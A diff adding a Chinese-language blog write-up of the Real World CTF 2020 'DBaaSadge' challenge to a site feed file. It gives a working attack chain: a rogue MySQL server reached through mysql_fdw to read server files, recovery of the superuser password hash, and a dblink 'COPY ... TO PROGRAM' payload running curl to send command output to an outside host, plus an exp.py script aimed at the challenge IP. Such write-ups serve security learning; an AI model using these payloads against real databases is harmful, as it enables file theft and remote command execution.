@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>real world ctf 2020</title>
+      <link href="2021/01/14/real%20world%20ctf%202020/"/>
+      <url>2021/01/14/real%20world%20ctf%202020/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Real-World-CTF-2020"><a href="#Real-World-CTF-2020" class="headerlink" title="Real World CTF 2020"></a>Real World CTF 2020</h1><p>比赛很棒，题目很好，我很菜</p><h2 id="DBaaSadge"><a href="#DBaaSadge" class="headerlink" title="DBaaSadge"></a>DBaaSadge</h2><p>就一个PostgreSQL任意语句执行，给的权限不是superuser，但大部分操作是能进行的</p><pre><code class="php">&lt;?phperror_reporting(0);if(!$sql=(string)$_GET[&quot;sql&quot;]){  show_source(__FILE__);  die();}header(&#39;Content-Type: text/plain&#39;);if(strlen($sql)&gt;100){  die(&#39;That query is too long ;_;&#39;);}if(!pg_pconnect(&#39;dbname=postgres user=realuser&#39;)){  die(&#39;DB gone ;_;&#39;);}if($query = pg_query($sql)){  print_r(pg_fetch_all($query));} else {  die(&#39;._.?&#39;);}</code></pre><p>题目提供了docker文件</p><p>看下Dockerfile发现：</p><pre><code>安装了postgresql-10-mysql-fdw还开启了dblink</code></pre><p>相关的介绍文章：</p><p><a href="https://www.percona.com/blog/2018/08/21/foreign-data-wrappers-postgresql-postgres_fdw/" target="_blank" rel="noopener">https://www.percona.com/blog/2018/08/21/foreign-data-wrappers-postgresql-postgres_fdw/</a></p><p><a href="https://www.postgresql.org/docs/10/contrib-dblink-function.html" target="_blank" rel="noopener">https://www.postgresql.org/docs/10/contrib-dblink-function.html</a></p><p>一个是远程连接mysql，一个是远程连接postgresql 。</p><p>mysql客户端有个非常有名的漏洞：<code>Load data local infile &#39;/etc/passwd&#39; into table proc;</code>，即客户端文件读取，利用<a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server</a> 搭建一个恶意mysql服务端成功读取到文件</p><pre><code>CREATE SERVER q FOREIGN DATA WRAPPER mysql_fdw OPTIONS(host&#39;ccreater.top&#39;,port&#39;63306&#39;)CREATE USER MAPPING FOR realuser SERVER q OPTIONS (username &#39;a&#39;, password &#39;a&#39;);CREATE FOREIGN TABLE c (id int)SERVER q OPTIONS(dbname &#39;a&#39;,table_name &#39;a&#39;)select * from c</code></pre><p>结合dblink很自然的想到读取postgress数据库存储文件获得superuser密码再任意命令执行</p><p>通过本地搭建环境获得数据库文件位置：/var/lib/postgresql/10/main/base</p><p>已查找一下postgresql为关键词查找文件得到密码所在文件：</p><p><code>/var/lib/postgresql/10/main/global/1260</code></p><p>查找一下postgresql的加密规则：md5(password+username)</p><p>exp.py</p><pre><code class="python">import requestssqls=[      &quot;CREATE SERVER q FOREIGN DATA WRAPPER mysql_fdw OPTIONS(host&#39;ccreater.top&#39;,port&#39;63306&#39;)&quot;,      &quot;CREATE USER MAPPING FOR realuser SERVER q OPTIONS (username &#39;a&#39;, password &#39;a&#39;)&quot;,      &quot;CREATE FOREIGN TABLE c (id int)SERVER q OPTIONS(dbname &#39;a&#39;,table_name &#39;a&#39;)&quot;,      &quot;select * from c&quot;]sqls=[      &quot;select dblink(&#39;host=0 password=jpr5q&#39;,&#39;copy(select)to program&#39;&#39;curl y5pwcd.ceye.io/`/readflag`&#39;&#39;&#39;)&quot;]def hack(sql):      burp0_url = &quot;http://54.219.197.26:60080/&quot;      burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;}      r= requests.get(burp0_url, headers=burp0_headers,params={            &quot;sql&quot;:sql      })      print(r.text)for sql in sqls:      hack(sql)</code></pre><p>rwctf{pop_cat_says_p1ea5e_upd4t3_youR_libmysqlclient_kekW}</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2021/01/14/real">http://blog.ccreater.top/2021/01/14/real</a> world ctf 2020/](<a href="http://blog.ccreater.top/2021/01/14/real">http://blog.ccreater.top/2021/01/14/real</a> world ctf 2020/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 比赛 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+            <tag> web </tag>
+            
+            <tag> wp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>2020xnuca_ezwp题解</title>
       <link href="2020/12/14/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/"/>
       <url>2020/12/14/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/</url>
